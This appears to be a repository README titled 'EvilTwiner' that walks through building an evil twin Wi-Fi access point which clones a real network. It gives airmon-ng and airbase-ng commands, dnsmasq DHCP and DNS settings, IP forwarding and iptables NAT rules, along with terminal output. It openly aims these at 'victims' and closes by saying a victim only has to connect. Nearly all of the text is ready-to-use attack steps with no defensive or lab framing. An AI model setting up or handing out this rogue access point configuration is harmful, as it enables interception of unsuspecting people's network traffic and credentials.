
# Requirements
##############################################################

you need install all this packages on youre linux:

1. aircrack-ng  suite
2. dnsmasq
3. net-tools
4. iptables
5. two wireless card for monitor mode:

 5.1: For create the fake AP (DHCP)

 5.2: To give internet connection to the victim clients (NAT/DNS)

Examples:   ALFAAWUSACH036 wireless external card

##############################################################
# EvilTwiner
##############################################################

On this repository you gonna know how to conf a evil twin wifi network:

first you have to put a monitor mode interface for example wlan0 --> sudo airmon-ng start wlan0:

##############################################################
# Create de fake AP (1)
##############################################################

hacker@lol:/var/www$ sudo airbase-ng -e "Wificlon" -c 6 wlan0mon
[sudo] contraseña para mr-unknow: 
17:34:04  Created tap interface at0
17:34:04  Trying to set MTU on at0 to 1500
17:34:04  Access Point with BSSID 0A:6F:F6:DC:72:EC started.

##############################################################
# Conf at0 interface (2):
##############################################################

hacker@lol:/var/www/myportal$ sudo ifconfig at0 10.0.0.1 netmask 255.255.255.0 up

hacker@lol:/var/www/myportal$ ip addr show at0
18: at0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 1000
    link/ether 0A:6F:F6:DC:72:EC brd ff:ff:ff:ff:ff:ff
    inet 10.0.0.1/24 brd 10.0.0.255 scope global at0
       valid_lft forever preferred_lft forever
    inet6 fe80::5228:4aff:febc:575/64 scope link 
       valid_lft forever preferred_lft forever

##############################################################
# Conf DHCP dnsmasq file /etc/dnsmasq.conf (3):
##############################################################

#Conf DHCP dnsmasq

Go to last line and write the next conf:

interface=at0
bind-interfaces
dhcp-range=10.0.0.2,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,8.8.8.8,8.8.4.4

##############################################################
# Conf dns /etc/resolv.conf (4):
##############################################################

Go to last line and write the next conf:

#Generated by NetworkManager
search 8.8.8.8 8.8.4.4
nameserver 8.8.8.8
nameserver 8.8.4.4

##############################################################
# Enable ipv4 traffic /etc/sysctl.conf (5):
##############################################################

#Uncomment the next line to enable packet forwarding for IPv4

#net.ipv4.ip_forward=1

result: 

#Uncomment the next line to enable packet forwarding for IPv4
net.ipv4.ip_forward=1

Later on commands: echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward


##############################################################
# Reload dnsmasq service (6): 
##############################################################

hacker@lol:/var/www/myportal$ sudo service dnsmasq restart

##############################################################
# Enable traffic rules with iptables (7):
##############################################################

#deletes existent rules

sudo iptables -F &&
sudo iptables -t nat -F 

#Allows traffic on at0 interface:

sudo iptables -A INPUT -i at0 -j ACCEPT &&
sudo iptables -A FORWARD -i at0 -j ACCEPT &&
sudo iptables -A FORWARD -o at0 -j ACCEPT

#Allows traffic/NAT on you interface that has connection to internet (eth0)

sudo iptables -A INPUT -i eth0 -j ACCEPT &&
sudo iptables -A OUTPUT -o eth0 -j ACCEPT &&
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

##############################################################
# Check the traffic rules (8):

hacker@lol:/var/www/myportal$ sudo iptables -t nat -L -v
Chain PREROUTING (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         

Chain INPUT (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         

Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         

Chain POSTROUTING (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         
  235 16526 MASQUERADE  all  --  any    wlx00c0cab0312a  anywhere             anywhere            
hacker@lol:/var/www/myportal$ 

hacker@lol:/var/www/myportal$ sudo iptables -L -v
Chain INPUT (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         
 2010  158K ACCEPT     all  --  at0    wlx00c0cab0312a  anywhere             anywhere            
 1731  326K ACCEPT     all  --  any    any     anywhere             anywhere             state RELATED,ESTABLISHED

Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         
hacker@lol:/var/www/myportal$ 

wlx00c0cab0312a its my interface to give victim clients conection to internet cause we conf the rules traffic to pass at0 traffic to wlx00c0cab0312a.
##############################################################

With all confs this you are ready to have a fake WiFi that clones the real and has functional DNS/NAT for the victims.
You only need that the victim connects to fake wifi and nothing more.
